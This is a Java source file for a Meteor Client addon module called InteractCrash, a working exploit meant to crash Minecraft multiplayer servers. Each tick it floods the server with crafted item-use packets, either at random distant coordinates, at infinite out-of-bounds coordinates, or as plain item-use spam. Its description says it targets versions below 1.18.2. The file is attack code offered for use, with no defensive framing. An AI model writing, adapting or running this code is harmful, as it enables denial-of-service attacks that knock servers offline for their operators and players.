package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.protocol.game.ServerboundUseItemOnPacket;
import net.minecraft.network.protocol.game.ServerboundUseItemPacket;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.world.phys.Vec3;
import widecat.meteorcrashaddon.CrashAddon;

import java.util.Random;

public class InteractCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("guh")
        .defaultValue(Modes.NoCom)
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("Packets per tick")
        .defaultValue(15)
        .min(1)
        .sliderMax(100)
        .build());

    public InteractCrash() {
        super(CrashAddon.CATEGORY, "interact-crash", "Works on < 1.18.2");
    }

    private Vec3 pickRandomPos() {
        return new Vec3(new Random().nextInt(0xFFFFFF), 255, new Random().nextInt(0xFFFFFF));
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (mode.get()) {
            case NoCom -> {
                for (int i = 0; i < amount.get(); i++) {
                Vec3 cpos = pickRandomPos();
                mc.player.connection.send(new ServerboundUseItemOnPacket(InteractionHand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.containing(cpos), false), 0));
                }
            }
            case OOB -> {
                Vec3 oob = new Vec3(Double.POSITIVE_INFINITY, 255, Double.NEGATIVE_INFINITY);
                mc.player.connection.send(new ServerboundUseItemOnPacket(InteractionHand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.containing(oob), false), 0));
            }
            case Item -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.connection.send(new ServerboundUseItemPacket(InteractionHand.MAIN_HAND, 0, 0f, 0f));
                }
            }
        }
    }

    public enum Modes {
        NoCom, OOB, Item
    }
}
